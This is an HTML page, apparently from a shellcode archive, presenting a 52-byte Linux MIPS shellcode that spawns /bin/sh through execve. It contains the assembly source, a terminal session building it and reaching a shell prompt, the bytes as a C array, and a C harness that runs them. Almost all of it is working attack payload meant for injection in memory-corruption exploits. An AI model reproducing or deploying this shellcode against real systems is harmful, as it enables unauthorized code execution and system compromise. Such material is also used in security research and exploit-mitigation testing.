<html><head><title>Linux/mips - execve(/bin/sh, */bin/sh, 0) - 52 bytes</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
include &lt;stdio.h&gt;
/*

entropy [at] phiral.net
52 byte linux mips shellcode
oh werd

entropy@phiral.mips {~/encode/1/2} cat s.s
.section .text
.globl __start
.set noreorder
__start:
    li $a2, 0x666
p:  bltzal $a2, p
    slti $a2, $zero, -1
    addu $sp, $sp, -32
    addu $a0, $ra, 4097
    addu $a0, $a0, -4065
    sw $a0, -24($sp)
    sw $zero, -20($sp)
    addu $a1, $sp, -24
    li $v0, 4011
    syscall 0x40404
sc:
    .byte 0x2f,0x62,0x69,0x6e,0x2f,0x73,0x68

entropy@phiral.mips {~/encode/1/2} as s.s -o s.o
entropy@phiral.mips {~/encode/1/2} ld s.o -o s
entropy@phiral.mips {~/encode/1/2} ./s
$ exit

*/

char sc[] = {
    &quot;\x24\x06\x06\x66&quot; /* li a2,1638           */
    &quot;\x04\xd0\xff\xff&quot; /* bltzal a2,4100b4 &lt;p&gt; */
    &quot;\x28\x06\xff\xff&quot; /* slti a2,zero,-1      */
    &quot;\x27\xbd\xff\xe0&quot; /* addiu	sp,sp,-32      */
    &quot;\x27\xe4\x10\x01&quot; /* addiu	a0,ra,4097     */
    &quot;\x24\x84\xf0\x1f&quot; /* addiu	a0,a0,-4065    */
    &quot;\xaf\xa4\xff\xe8&quot; /* sw a0,-24(sp)        */
    &quot;\xaf\xa0\xff\xec&quot; /* sw zero,-20(sp)      */
    &quot;\x27\xa5\xff\xe8&quot; /* addiu	a1,sp,-24      */
    &quot;\x24\x02\x0f\xab&quot; /* li v0,4011           */
    &quot;\x01\x01\x01\x0c&quot; /* syscall 0x40404      */
    &quot;/bin/sh&quot;          /* sltiu	v0,k1,26990    */
                       /* sltiu	s3,k1,26624    */
};

void 
main(void) 
{
    void (*s)(void);
    printf(&quot;sc size %d\n&quot;, sizeof(sc));
    s = sc;
    s();
}

<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
